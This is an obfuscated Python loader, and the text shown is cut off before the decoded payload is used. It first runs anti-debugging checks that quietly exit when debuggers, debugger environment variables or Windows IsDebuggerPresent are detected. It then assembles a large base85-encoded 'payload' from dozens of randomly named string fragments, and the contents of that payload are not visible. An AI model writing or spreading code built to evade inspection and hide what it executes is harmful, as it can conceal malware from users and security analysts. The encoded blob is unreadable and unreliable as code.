#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cxHRV5vddFlHDj = 'zT69M(`@kW`8dNmS8jg@uAg0~kxae=Iv?NL>0$_Riv89f630;wtk60-vHeX7$iulQ^%A%cJq{vZf4b'
_cdiRxv4Hku_TKk = 'Q0)isY2QR%enD8jjU{kyVRY8)uUB~e16i}x{>h3l8cUq9`#dK^~tYoA;!72(8p3%8r-B(N1ZNnGWrg'
_ca_crouS2_oEva = 's!cxr<#lvvVyU);$H`4h7&uwYsJDIP6kY(N%gt&oj=Lj{;fgdoe+ZY27<34(IQ_x*+2c&KLe`a_E^~'
_cqrLfOPC2fgR4H = 'sm6J-&!k4RdvB0iIJvsC0KIDH0>H(mcBPo>V+s_mhaRyBiZLSJJf>kvOpxbOpb9UmHE4$^C4IjT-FZ'
_cfizjQj93ufhvp = '>o^@eUookA0T?^4{4Ce=+~^3j0Zdxy25h<3Y_Jc5o@aqMSrw>{-lTolB5n--kj%dsY-iU{Tu6eD4L='
_cz0Dv1OHp68k7r = 'QE-jr&eg7gkWza2!%Ht9*-|Gm!zd?Y6y9X{Tq1Eh2!*#Mb<)l^ArXMtiS=CFxj!?Xfns0*p~OYP#C='
_ci4xOk1GJPPi30 = '7UOT~aMcL75gStssA;4SfPQ0>YiTk9uw(F!~8S|a?)b$J9-#JyJM3~kV#UcD>F6?l;|ARUpcNwKM>n'
_czm2bwNT4Zcmd2 = 'KgUk#U)c<N*LrXnU{MgTH>pMV*HXicvu$nl~~CT&9*Bb88s%4G^8X=yDHvhU3|x>R{RAP>>ls=PfX$'
_caxbxyBRJUcrTL = '*8ntiSQeq$cgt6=TL!K-|u-2K7a^u($^f@%ZB{>zU04u$#GZQH6FYQ*sx%82kku&1S%27;yR+L^-e@'
_cvmWC_hX8oNrE3 = 'GE|^UntfsySyPIzwuwg+CPH2AUH#WSEK!*^z~i+RPQA&;5D@AF@^QMB+`Oa)p83m46xI2GOryYJR@U'
_cdqYni91B9UbAt = 'ZB*7~7fpB!g{9T(SrIWp5I`6sjukyQD1*ckgjs*pE@bw5&cH##_+6UpDdi%wc4I!FL^_O>(d7}!-%0'
_cb2738B5hdoXVy = '3=pLsdI>_Td-V|o(Z7Uky{^-3xe9F>fc#*Xg9w5SbG(;)DmYfygtGlKhpK^oo})f-|d(T72~?G5{iJ'
_cqjzTEz5OwnXMJ = 'LJhXgY8O_PVkho-ipGW51M2dQG$VLc>pzWhzz3rl(cEiLzQHRF_*e#Yx>DK+{+l8Ykm+FM7VN=dbLJ'
_cv21UPKETZT7B_ = 'hGU8^?LUswhj?SO!5n%y{O1eVy#3Zvq*rTb7pp<b6>Z}i7{n{z@$9;!BC4S;n&OJ_Y#zTzv|AaOEb#'
_cjxG95BLUCZ0WR = '}%%DY9|9t^?eeZIl6i05FCj`eQO@k{ay{cOG40X_NWj{RY@cu8uP1;@-`z<14=AI{#tAT+&W&a*MBW'
_cbtuIBFDeJtbrF = 'Ai`py>4HER^Ej$%frIyEk)rdtiF6K-b(1Ommx!Sfj$iyc0(k00>x8~xsFk62kZ9JMZDe-2Y5NLw_fi'
_cgMTyDXlkl2CYe = 'WQ_jF$PB@suhe<p;acNupK@*ZuuBY>OR&9_?T!tPDBgC`qRG&dH^z~76b+=oGyeBOB;gCH`l`_j9*2'
_csLuE_PxOQKAyp = 'Hw|T^`cX>K-nXb*#`0aB%U^n|Az`E(UP4AZd=TpUpUY964=>j;2j30d{!}sWdNU#$tH1I;LE!*BaRT'
_cqPMUT2j8LRkzN = '-HtGPcn<YNH>Qdl6^*>;+-LKF*T!0dE0}dIsBEidAz<aj)-mPGhkw;<5!?x}x={F!dTj?~1yUX4SH~'
_crgDMS7tM4cCii = 'mEJL>+#Z8D1N*9CpB4NPO5l%kNd4nDw@!K&RwmMSW}VE%-1X^e38F`O$+^^3Z;4dJS?-dftJ&9TRd&'
_ca21rPDISHg_pb = 'Nt_zarl0rHBFNa0NSaLGxtuhY5;(6QBiUDT57gY*ufFA6MiCHL_u7?6M595iwB`^h>l%e92xXQ~pro'
_ciIH6XSoUYK5AQ = 'lro<N8;-DxEkSpVybY6SyohwsslXsB=dCfNFqB@nJGY!`-CaSX_0r{sK1l8%#bo(gR)qax-<>in0kl'
_cfrmTZLkD3CqHT = '3uhyK>0NK>S%1T;SMZ?o#503WT*Vpt=oX6L>)`sH!2CFF86b|b>Mtvn6*^&Ym>E##1QMJ@o{qHVknZ'
_cv19Ofzxan5hsG = 'Jw=Rrg5M4BiE19vt$U5jm9qvKG`U)73<6OrPJHbHI-k`FSQP-cdY;)E6QD0)L=@R1}A#C53?V`AB>i'
_cf7ZbYO57Y2CO9 = ')B!tM~v%0r@(i8CAD@CCIHp;nNQ)48wcrTrP9}M7)9Fd81C7Z)oka=&gjR{sqv=CjyZQ9z&Jvy`Hvl'
_cwFSVJ01MlXWe2 = ')4j6<_-lpx_Yhun#c<=ign(z%4BLL_C-W3aIARhg)q~##7URW^jj`mH-mv<xZ;X8Tt-3*d1WM+1e`}'
_cuXitewmrGfCzS = '7i@XDCTj18(ZTgrfP^Xpxb6UX=OASG$R@CGy;IU~bR+miHFquB!}MYVen8`1qdE57)%C;msx4N=E?Q'
_czsXeA435RVETR = 'ak1B7JnQ^v8G(-Zit9Qunzx@5uO3o8kCP6EfDFX`Z8G4kDMY9C+5);1uT+SO@l?S$Z66fIItHYsA%H'
_ccG84ofPiXYU7p = '3zz>sBWA2IOl0Ufvtpo2T)?}89d1*EGacKK(ATm#S6KP4O6E>FLszkEnN~CS_N^gGpM`w3;3UV?xiG'
_chbdVKrJQtbCz9 = 't3+%4h(ORayPSrJ>S9b`Wk_TXXq&q{H<p%^gD_;*_L|x>l}buv31zo04>K_|-RlNMVCbr4C1(kBuUO'
_cuOfKHkyUbFJCF = 'ZBdKHH=~I3?_V4Q4dDiVPnYWwh<fsVfHP18wdgxqysg;(ndT6_$Q4aCvgT<D_e3)swdrf@X+?Ek{fU'
_ccgSOho1MyhjVd = 'Uci)DT{;o_o?y!*L!+?D9sPw=yE-K>M{;^HrdCG}c1i~^I1oFoquRa(eBH&pO0V)JeEU?vea$&v2V9'
_cld8cW7Yt0F0mA = 'yh{{bwSv`W5Ma<vu1)z9V36mC%!=scz6y-3nHgHD+i1@ohLZ~bmFAI5b89i4#&5so)p^UU?)r?ex9H'
_cxAGVsI3Mtl4yT = '$q6A#~I+uw$IyWX>B$FPsPA;MN0c<)0o=_x@QGL853J+*sjc>&fmw`klATB_A)&Dwvhej)7M(+~nrW'
_cgVLeOIecD9zNq = '-#=d-zo7bSYlT;73{O@yE)<x{n||183|)=z5wPs4Z`?FU`OGYWlB{s@MT9*}F0LTdfxTxNle;8z``!'
_cs1ptbHwFRjIc3 = 'Dn+or)*#FEvl@5-#NlIE<@HL@_%B5}IiJn_R!<OZFBd+=9keK%SN2wUr)e`3a+2YAY5*;Tw$6X8iG1'
_cnEBmP_EI5CmNs = 'B_s}>lF`IZ*#i2-kEG)H~}NcAv{068r`?3S0co8+yB-g_=C6~Mx_mm+V7H!X(Q{amKje)m9g{nMlg4'
_cr_tHdeP3Nz8Ls = '9J5de*)Rl;8WBWs7!f*RiP6L$)oO4zzi;*RN`U+6PoRk#M^hAUySLm5l~sM6vn)wjg;CC*kFs5nsr;'
_ctm96XFos5ijeK = '0S^cu+GMMN@tw;ce-|}AvQ773rA6*;MN4eJcI*zPsY($)fY;MGLS{o~R)IE%O-JL42abSGcuL;(1xW'
_ctkjGI1QPOrIw0 = 'd{~T!kra1k;ZQ$~xvNDOBUO6%9`J33E;(eazg{(u22QQB@b-jrb#Id0oB2Uc;KTQw@kdFxrNOq0uUr'
_chpNADt9KZZRAI = 'r#eskqEKfQ8WVdt+kzV8kv#pD+>iuQA0;fs0-PKyPKyP_|Gium{BR@GMgaR3HK?U%SRy6f;;mX-@s~'
_cza85DnF6asvPl = 'ExF=3`Nr4<SvNVn&R2PS1F7z{^6&~WH#$moo(r&#~A`@$V!H(sZ{)wN6qzvl*H2?OWQVKPGN9@DF|J'
_cnVuO9ybBjAkrQ = 'y=ak-x?*A*Zum}mB$?#a`Ap<gU5HY4%twN|D6c5NA5z~*(?cL^C~xNd-PhipY%!ljz>%$oSc%ug&c|'
_cf0OqU4e0zaL9p = '?l_^h>)YzMXmdLZjB>2Sj9ol^|fU2?6tuT|3*)u23%fPU-^FQJQE!FRQcsJss1WvObCRY$hl202^9V'
_cgOv01hHUcSrY_ = '`eq;Q0|}laT<W!j@B#P9YZKr(Avwxc4NWKR^nsQO27Qau)i*8D){pO=mg5XraZJB4K?*iu-`>awsq~'
_csxdaFNmkzoz9B = 'LisC7SZYlfCPa)02_3ujAH9_YFagZ9OG&gmGWz@~V2K?sj7E)Kxj>G;9lPYZ9q8Ap_l_uNBprD+DjE'
_cxKzLS9Q9n6jPg = 'xZkL*7O<B;?R8X5>F(LpvR&E<kWB=}E?S(oWFq<}W}m_&NKjkn3$MFxr%o)W`o_r}CwWu=<>t!{n{`'
_csOLkbG9LQJNTr = '9!70taWgRa;@Ub3Wpt|VggCVo#juO;{urKq^Mr(;BcLgrA%ljU>Tbu#o{Tk_1xf56d3uYo2tmGYy*~'
_cyR5f4pTfwkHKQ = '+4MB1I{NITqrZaLue=FfH`^|)1OJDZ=$tu1qrjaXD`1(4FZi-cxRbN(T)+zK42cDcRUMPcnxq$81L!'
_csaIfP2n8KcYpM = 'u)i)2hwCrXxJ>X$4S*vLGW*dv*ZiR%bs9JbWsNT3Mn2^^``JC4M)(HD&WA8U);qxz4X7VQF#o;4o)v'
_crZemdgJOsLHR2 = '9pPgIm0A@k254NTE^Q36NxBl30&}`@fX}e&=??CFyJ~IMd`$m@+#7;%`?i3L9lXsIA?i~K%XJ~1AZ_'
_co_hYkdFLFLZLp = '{H1S&p*Ww6VWN^Ur(w*^9WOE&d8)9{C+?^O>E29Zn?W#M9{X!j-cj88<YzKSQwHZK8tjV$;%S2ChC_'
_cxQ8GesWSrdyZL = 'hec7<WG_ULF$jjd6f%;X^@V{vfg4S;RWk)H}1~#C!Iqqw%91mW!y9wvD-+2wweLZ0@4gM!WMz=a~Hz'
_cznpEyWRpvPKJs = 'g&{@Em9NJQ}Yt)Do0Id8n5u3Y103vt>H*;mPeWnu#fNAa%-u7R)SRShj6F0O43CDA{EY)eSyYqw+S<'
_cdXaw0cBSIzgtQ = '^pE$|{|GdY<PUU))fCS<&;fvZX329oA^7pHqtNjs33pG%iBv#jYG(8<_rH`;Kqi5TH-D7b9#4Q;V%B'
_ccLztq1ELRLwLY = 'qZpNAC&+fTVs!SS4hQAVx(e}qzb4JLbWnfeg=lkcBARwf6$-DiUWe{7ode0<Zw|9OVQHImIZqjPX;{'
_criXf5AL2egl59 = '5u&M8@9@4e_fB}k;AooWAw8j^gHc;%BQR`ML1s<iZub%0GP{T*E^#jLic*AF|nu3wlix+ZI_3ukJ}^'
_crTYoiD_ADhuTL = 'Og&DbxAK~QOqgv)7l-SEgu+2FjFF1=|a&(LaPImv*?MD&M^~2P&J+9t!w|4S?%QgW(`n(FWpSolrZ%'
_cde0cVOlw6XuP5 = 'OMX@lsbf*x8n%ZUJ0L!Re5gLfG3q%?Qo~*l6LCWe?SKBRnvE1%FKjj23iihE);n5SJ9K4L<VbgM27N'
_cto6fwDz2Bb_9l = '*fSY^N(D-9Da`eV?&msdC4UwzCQDef9_cgYJr1o>h;LRH)=@y^W*zJroLf^5gybz<0gpjcN1JlzUbH'
_ccOnFKi3m57aTg = 'Tg4Af8s{bXr4dAnzRkNO4LrXz2z6fhW+|X#(R%xWSSneD?3XvKM#uM~)wRd}?;IehEWR)&Z*${T*=u'
_ceDQmWVh0ep4sg = '(cp!M&(|Bt~SUm$|dgQT0p-w(*JkV=?uryUpCM<lqS8_e5cOEXt}L2DrA$W8|9jjMCMsHwSg!ha-8D'
_cdbmj2KANIpvWs = 'H~^~%>atxP<phG+Wn!AaWA5+4xYp0gZw+9nAs}&YcSdY{nC#<+Hs95A9et~E7N5bZ~ZJ1x|$Sra`Ob'
_caWnpGXwXe_nSr = '34l7fg(lvy^FT~Q53DbzCfVkMpKsPYE2Dy9}R=1~X8tcU{<S*FUqT>s?5Jpo6U36jSM+f5(LawLdCm'
_cvHSVuk415AfAv = '(zZ{uBVRtt5%B`i38+-1p2zabXY1p;3AHN|5)TQaoM>9ezhOAF%mx1?cR#90L+Ac_Vaf(S##uZVS+U'
_ctVIWU5gc_fHVr = '>6pUL0mQz2$j(2YzhSq7Op!>v+qS&q+YB!w3chrdliU(^MaOu&f(mOvi-Fp{hoya@JubReb8i#dN*0'
_cyYr_Ffx3UdfCZ = 'ImOMx@Yw;igqZrTg!TjIq%s2RES<I!2cZc+)yC*o12SYwpQ$gVl$xrolTTrEg=O%C}_5d$4PMcR<77'
_c_JOLdYoqdVjq0 = 'vYSc#4jIOS&%BGOJK1vL;GdXO5wOfIn<X9-ENlcgDPa}n?55dWHBlnoDFdh1!{gh(0z`;)lj{X+eM{'
_crP8BQpHFyo7Hy = '{dus#6DMOUMJ9^bkh`n|^iS(rJM2TiB7c--XY|y%P4U5H5%R?R4i@~s_{CpM0JyuY&&;zcWEHI5kwc'
_chCUTSgl4hxKLp = 'r9-igb`lCiFVG91c++nIksH3&`QBPscWM_uaZ+Dw&QXmAEbkr;tU~pnW=6FI)V%FstGj`^ht}cbwC2'
_cq6g7LmdUYaEDf = 'Sp|G5;^ZH<D2BPO(cx-Ew8#iRM!+E*#vpwP(OV#ZL@6l!!YlV##0ukFCO?*MirI{>qNiN_q`~KZl+$'
_cjchT5dq1AxiHe = 'V;KlT^&)LXwm38L2FpLq@ryQU<#(%^o?*LW5F^JnqDK+z|-`3}px9N@Iq+bN3GDbKd*OPDMzHygv_b'
_cyZ4nEcmBLLCZ0 = 'nE=^{yinY3X9kFWomcq{KGpu#4JJq1uyfa{gb0V6}dBO1!=($En}1$ZsM;RVl80=S{vvS*B!)TV*Ly'
_cd3tYpa17pJ1OM = 'wF0K<qf;2T_s!eR}7T4*v#El2FnS()8UzWS9+j9~^Uvq3u!waFg2%zS(YS9;#W(&Cgu%b;5doyXHr;'
_ccyaQ_MXOUIqWa = 'h9}>0k>!dVTcuA3z9qQqwnu+<~tnBKCNsB5Fe><LKU$-)#dU6WtZHCQFH7Z*T)=NzrFca=cQ5=q77y'
_ctcpD7bMuBzns4 = '>G@hbdZW6nbIiqV?qM)WL4@%aRz_;8*^4$6J2pEX^}`La%WVSKmFP(^CS-Aasd!apj1Osaq%D)pVev'
_cmDIkwIiCp5HEW = 'OcmmM7$H`E&}Zytur%D(*P13V29z{-Vnh_gzi;yz6DI2?<CnU-+n#q>6GElbLod@B1E`ChEOIm?W`h'
_cwRAZZvKrxl6ct = 'yiuu+33G4pn>5ojg=JIzqhL7k+>5Xphy#ITTzb#vb1AEEydi9m7(|7ecm3ELV65|sa$20s=>QjT+#f'
_cx6YzRlYyPa4x4 = '9z(}b%$HF`<ZOhAQl41D+V)hL(n^%(!Z=K38w*Z=U?$c1|b`%4O3PO#@Kp`UZn^pm0C|%s&wgv}J0~'
_ctm_JEoGTvffXw = 'vc-`h-L?wzLvh;K0;RQIJdQZ`O2+RTPB+#jBHJ6jfRp$|~gLWKoE(vPRBXbA<TQ$J$aVZopJ|ddhir'
_cuOBmhMpUt5T4O = '8*Y?jYN0UKyUefx<N>2~6hU)p0rrW3R4EdSa3RsMTS<AZZG!CSG&F6@%X054^n<}cxsC6Eu2{<-H1i'
_cdvsfuFtidSyxy = 'Txw9@$4B|a%44xO#Ba=DD1Y)QXFR-q=JtD-S+=t+z(te1=UW2!f`8VO&5`>Hp3Iw>pAwc|QPX)DQf>'
_cjCnYri69kHPOg = ';chzD0iLQ)A&I^JsW=MqDa&r!&t#sp6lVK%bn<qE@jo6F7oUK2C_`}b89Br-9h#uhK>w8H;ck$<k6z'
_cibcz8rQ9HuKgh = 'R$yxWT{;^$qB?}|-qmF?KBa_Wq-Bx{kmbuI0P%t!2Rv%L<{31WX73xvnv1<n?sK>W%#6ol-wkDsAbM'
_coYNFoEpcTYohb = 'dzv87Tft(;6D@T#K>e1z6Zwq)f#su_hVby@@0RQQckXPhHImZzHdz+imw7?%OPxE1o%51CqTxmZk7;'
_cdZPEo7HVf_cFM = 'KX@Pl&;n876<{p{QNdrr$Tv0K{&xMCJ1B(5gJ<3THEx!E!7x8wR8c0_Vb&J-?E8K1z(*|{nSXY1n8*'
_cjUn6Zs0chyyCv = 't$%HkITYGMv~;~xLIk!Hl&i&$2F#Q&v%q5S7%&&C3;gr0UE=*K;VpbJS7|H@3kLfTQ*?!#y!BjA)aN'
_clYMtxwf4VgAgk = '9r|PM=m7O6kxiOYwy^PlamPri*3>^oK2vF?v2Sd^V}+({%T&Es@|n<v%^SqJtsLug2~7m$r|%0x>y_'
_clX_fpbSsRG5tR = 'KIJEHO-2zLo3_z;P)<tYTT$#LfoWSqVw*y<LfVu?(#(mJ|@c4QXo19~#)S>f6RSCL&pt(^mvrU`=0%'
_cyr7fdyujjgnJZ = 'HIfDZ%57XHwd+ve@UnW64XPf5jKRwABt|oV(DA$7FmLq(*KGAp~vuLykRN$C$p2Xs}4qgegAB_q!IE'
_cthDjimyKSV1RT = 'Ji^y<+=x{IX+XOW)I3|vENWIWOK%%xHv3(xAv;G_!dxh*WZJDUYA|;CqI&UJSmvJjW85wULb1`EQF3'
_ckCESJyaRMnEd1 = '%~<e?~V|KvlOG7@^BB~{h5ox5XLDL%<lM3yl_e57ZWfz1)W#|J9g<Aeo8-IGJ=(MnQr(p3gj{7;a#p'
_c_83udO5HYYjNj = 'E*t5KhuveoF0&047N7|8m!-8IQzVNJM$oqx;Dk~9duAjZuPN21;49%)SNw+_0E&^r;B0$G&F3mYwtK'
_cnw_mjE5gkyTRn = ')e3ntGOXfXdwxSQ*1!0S=3YmwrSuVqc=t_!^(ql?@M-g~LlOtFd0G<I&I?6<SEDd<L`N_FT=$Nupt}'
_cel071moa94RU_ = '+ox_TFeuOG!H*Rp4@hW!1xCpFBR<C&3cDbb?atVK$nXmp+2kNT}hZyO!oMiccW7rE$XcXITGX-xQ{0'
_cbF6zXwkrUKP4q = 'J2g6c&ae*e*T$51cr`)+c`59i2s;!Neb`j8zuXuGS1xa-^}><;#H;Qflrh_T3mf@zXhH@N)S@)gu_P'
_coi0u_ZjolY1jn = '79G6d9LCo`n^g8gCH;@f&Eo2!^s_3J00rW{E2cAdJT19c?5lln4n><Iq>j1fvvt3v*dAl>;~2S}CLI'
_cjXhIxEcYZW4rL = 'cqv<|9$cE4~dae{p(+Q(CMgPnP+UG_YTPRT#Op^a(}HCTA`*t*bicX(Ka#Lb%<$7=Ahm9Gg16C5ebk'
_cjDISjVyCs76lk = '^7UFSg_^@Kz*^TeVlY^Pk?cU;#6RPn}4ofq8`x<rEf!k{zmJVy<_BslVfe67jiqbMy&iSh;ef?#nIX'
_cruQvhr8chRdCr = '>~e3@F*JA6tOqsF5G!Bb`sGYC#K`&j^+@#yVb3t+fb{@%TUoxks9_XlZtl`-By}6<)k1+8IO2=FB?*'
_cex5FwK1xHgNR0 = '=3jID9Oj?=xs}P!kp&7rb)(3H!Vna^mt+5e+cAe1bEi!CfUz85)LfTEUI_00t4tDYla+;@LJUd+T0_'
_ckcDQEYkdXt5lj = 'iY5Q|738#MXN<{r6QtEVD2j)BB55j8$!L6WXxIDYQ-sXsG|%@9BGLaxsA6;bc@Js>vDUJ#Tup)+V<h'
_cgGzX76XVQnJGO = 'x`T@G)(<W-}Fil)qB%{Kxk;02Sk-NowNX93imXJJAE%)7Srh4_S;Jk%`36UyVgY{=A?<>bX01}qG91'
_ca1f9h0AZs6odj = 'P{1fAo&^8Fu!xm?tfXK)_t}L?x#{Z3KyHk7I=EtV;a$cG?J(FOG`RZZcG;4HF;k`1|j&Xk;OA3qX5Q'
_ctvMqOcVUBtDyX = 'orNjkcoE@QAb1imbb}gQv0FSn3W&Yxm3~mcVram%moAw?rJ><g_P9Psm(UhCQOJVW|bfHlja+TiWO%'
_cxukRKclQ36U82 = 'ncZxTp42D&AKJj5PAKV^+O-v<nwPpDZBS;e(V$~~4-$jfd$JRFT`PJeK9IDzZv8$ar4C$ZMz9lqEYj'
_ciEegtJ4vW0sUC = 'j9_H1%i%CchU)~!fu#yK3HK*^-W;ni-rL%M@TLIs+BwOZed4P+x~USHwv$E*(nF)!Xp(aXehCPO2iK'
_clj_qiG4o3698z = '2K+~!uzrI2%ymD%6{9*QjE-70v+5lI$+)n^?Xb=w`KqYHAh`mAc&r5cwl&&)!VUjf*9($2(rA~Kt<2'
_cwPwsdJKp_pFwd = 'Hv|MeLujXVVIFIZ%{f`z0xtnQWP*4$n*V@0uAe2vdWD|?&m}@saLI#Utxfc!}kp6mbptBjtuZ`$9wQ'
_ciJCzu5h5Ecjbq = '>Hm9FuqP9^5<vPItj}+l|%74=$AIL@^*~Ry4Bggnox4Yc4^G0kCvZUP-=`aRg}@q1Qd6!uM$9z_yR`'
_ci6GYkZz02BNEH = '{jNkLCDw!ZxzeFqlmz2xPiR7@5Nz?Zc9OV+Aq7MK)`$OF_~S@pVMO$5aj^Ex7uCsfhX-H*0S%CQ=P6'
_cy8JeqorCWLLBl = '1qWv1j6m=R&jskCRKTdD(r1$7Ev51af9zr2APuhm#jQBb1d;2x(UEYs2R1=zq=fS!;Th7Cb1Kj~nPw'
_cqImCRPYrgaGhy = 'EzQ+bExt#+YQdx;yAj47&J>qQ+eGv0Hy(e`*xzy-ku$Q+S`OvH&825dvsc^Qm6o<UO05Y#o@fT1-dQ'
_c_RgNXcsjnCjkE = 'P2El6_96Hby5JCi~Yp9LSpI(8`4+6dXmOoIoiX1CFH}SVEdX(dk_?y4|vcCp8`wCU$($MjLD(*ssiZ'
_cjpEQld37h5Bqp = 'rElnf6>bQ3Wtx#0x8m0c$OL{3d#Cq-$-_LKs*^^NldJ9!B1z{B?sR#3V1_ONENFO1uuqw5Xf*X(qQ9'
_cx0qDQQqJ4nmoD = 'kRsd2T^c`<#w(rZXO9qE|Dg1u(%E4KfW!Lhasp)-ZbZhNq{><ko=rHRcqu!+NrK&SH6JYJDP|uUydB'
_caTHaUvlP41_nU = '-)O0JBu%L-^zPf5?+Rp8pkeWBN4LRH@z(})X6_N`_z8=PpL$0J;hKWY>l;_n$+Wmc)#7iK4`&g}9r1'
_cdnbNgbHzyIDFe = 'QG<Sk}zo(AkX_kzB1_KR@}w9#KITnbcw%Y`#FRtoAoCIMo33pcE@t>9FKasc)aE_O6n?UaZ)(h_k$;'
_cqafcDFSuSv1mp = '^&dv9rulv6|^7(iM%ukCD4hPe3Qo9M19DsU(#GW5dGN#mLXDlV}ispxWcF&XT@DQi^xyQqNavn}3sa'
_czzTDaRGGmudYg = ';`&L}CSnn=UZZ!fd-z08V;Nom1pf=5(WH@D#7?ZlhZ%nhKG}Biz+L&cmc*evQZ=M*X$F=mYedZpl+I'
_cetXHhCOOz_H9j = '-mF^4)P*x&uvb*ARJ5X8r@DwX0p0vv!{Q1y+_E`9NRRbTo5$BX)e)$yWX`^;<VA)H<Z3|97az`Y?c-'
_ca1xINbt_nsGrQ = '@~C`RLMHpWB=73LB~o??D|{XvQR<Iib(%61bE52w$zO<ddc3T^8^J?2GvUY-e#laE{(q-HK=A0~jsG'
_ctkLF2L4nEvKAf = 'BG>q6prfrx+NOqLI`+rI`h=l*E;XZYxJ1Ym~96ZFo+xbmx1$?#FhiGU}bMZbRt?KH|MsFk0^CI&%kp'
_cdM3IzvA0Ld93r = 's1k7i7T4j$UzlQQQ6FT)fu~Myoxf_?C3DwV;)TY(58Q+K)8d{ArjB&*a$aYtjF}I)B)V)ty77_W+Y7'
_cudTINcU3PFwff = 'b}_hj_jK>d=JA8v&P<NdgPh$+0jR?<;gjTg?j>Ee6~N5N?)i8HkCcue|!q0k7MW`9XQ*(0+)UMVNN='
_ctWNS4H1JIgVG6 = 'Y8PSj+1u?9pDF*k9HrP{pL_eU)=Z{2S<}-tKg+($HByIL&*b#0u(}rj*7TZulvNY}#;?|b4iSXj5WW'
_c_nIipCjtbadgZ = 'uv4yGfnDGe7jB2tebx>C9<OAg=V__vdZ@pd@wGvFv^Bk16~gdXaJuTE({Hptu5GVlu=JgI&YJuIoCZ'
_cqA65qydbFv75L = 'Xa&`>}KlGSSVH0v3~MG0g((WcwWy3HZjBA+*fXFh39r;66#WAOE9BgyqVO+{7%}DG*=G-I<hlJI8EQ'
_cnDEEvZ_x6hK13 = 't-1+1lgIC+zmo`z$G-24Ig!a_|X7JTz5`8>bz(2SBvN>D|(ZvCjv~$5`-!APRny-L0-XXRaJAppJ%Z'
_caLAEZJrKzkAUk = '#UTu#!;G^?FXbJgq?~F!~PA$=iC#D8Hc*x^XNo8k)GEmIG#|m?&Wj^4Vcao+J3HI<w<^5<l*>Cuv3O'
_cthcdgpRPS87Lm = 'y~<`K+?c7sXPSEZb~Sm3`j=r;o#-ntUd(4kgEjU5i-%uOB|GR`*vsGo?O!un^!M@P%N2&#a(?w6q*-'
_cunIJ1skHbBQv7 = 'cV^FZV%`SMt)sno5tSb<T}YK~BF7;Od0={u3y?}Cb4+bdSbvY)CP7p@;}SEnM{rg-Z9;&`-PeUU=`t'
_cefjc5ld732179 = '9hhgHr2An14(si#Le!f;h=1msn?)v5|IN)@Q6uCVF59xDrFBW_#DnR`QC6&mshOA6h&s55cN@NI_BC'
_cjTwjsckDU214v = 'hU`L<1jV>5d!+tI`CR`41So)<bvn9G7|KD-S{UBv?7zsN5{sP%y`P`CPN}HwexrqM(kgnITtU900QR'
_cxl2ss96KgurAJ = '8408<(R+w11R2@Cn`@bv-rPydcE-JVt~j2#~SZ$pVrdv9kH;cI8R}DN3s{%{!22Y39rOQUe7?1+cYr'
_ce4AcX5Qs2ZjyE = 'UF$-bt+EN!IQttHZg{EOw(vOTl%%khEF}XC1N)~iR<iZ`$;V6W3=;6}H9tXjkYA8K?tz2MFO%IlQ2u'
_cuGhH1WY5k6H8_ = 'a)E~S2?)RaJ?&$xIcWFbi~1@H>lTMe@z@kSo2NZ)i~M?w)X27WhZtj&(xNsr*^id7DdDde>@RoT2&%'
_cxnhHiU9Kwy8Ms = '$9>bRh1Ro{_Y*S0qcvo_&GR|RQ)+iLk+!wu?;_auN+cg?&E#u@kOlM1+*`>okKj`At>1NN$Xw+NYa>'
_crOvtLDrqzolQe = '9I00I%=TTTU;~{OkAy-&_AX9&BmwI8fnR!v@McUTZnPxA3ubTCF9tVwr>m~oxrW*'

_plSwurwVT49piL = __import__('base64').b85decode(_cxHRV5vddFlHDj + _cdiRxv4Hku_TKk + _ca_crouS2_oEva + _cqrLfOPC2fgR4H + _cfizjQj93ufhvp + _cz0Dv1OHp68k7r + _ci4xOk1GJPPi30 + _czm2bwNT4Zcmd2 + _caxbxyBRJUcrTL + _cvmWC_hX8oNrE3 + _cdqYni91B9UbAt + _cb2738B5hdoXVy + _cqjzTEz5OwnXMJ + _cv21UPKETZT7B_ + _cjxG95BLUCZ0WR + _cbtuIBFDeJtbrF + _cgMTyDXlkl2CYe + _csLuE_PxOQKAyp + _cqPMUT2j8LRkzN + _crgDMS7tM4cCii + _ca21rPDISHg_pb + _ciIH6XSoUYK5AQ + _cfrmTZLkD3CqHT + _cv19Ofzxan5hsG + _cf7ZbYO57Y2CO9 + _cwFSVJ01MlXWe2 + _cuXitewmrGfCzS + _czsXeA435RVETR + _ccG84ofPiXYU7p + _chbdVKrJQtbCz9 + _cuOfKHkyUbFJCF + _ccgSOho1MyhjVd + _cld8cW7Yt0F0mA + _cxAGVsI3Mtl4yT + _cgVLeOIecD9zNq + _cs1ptbHwFRjIc3 + _cnEBmP_EI5CmNs + _cr_tHdeP3Nz8Ls + _ctm96XFos5ijeK + _ctkjGI1QPOrIw0 + _chpNADt9KZZRAI + _cza85DnF6asvPl + _cnVuO9ybBjAkrQ + _cf0OqU4e0zaL9p + _cgOv01hHUcSrY_ + _csxdaFNmkzoz9B + _cxKzLS9Q9n6jPg + _csOLkbG9LQJNTr + _cyR5f4pTfwkHKQ + _csaIfP2n8KcYpM + _crZemdgJOsLHR2 + _co_hYkdFLFLZLp + _cxQ8GesWSrdyZL + _cznpEyWRpvPKJs + _cdXaw0cBSIzgtQ + _ccLztq1ELRLwLY + _criXf5AL2egl59 + _crTYoiD_ADhuTL + _cde0cVOlw6XuP5 + _cto6fwDz2Bb_9l + _ccOnFKi3m57aTg + _ceDQmWVh0ep4sg + _cdbmj2KANIpvWs + _caWnpGXwXe_nSr + _cvHSVuk415AfAv + _ctVIWU5gc_fHVr + 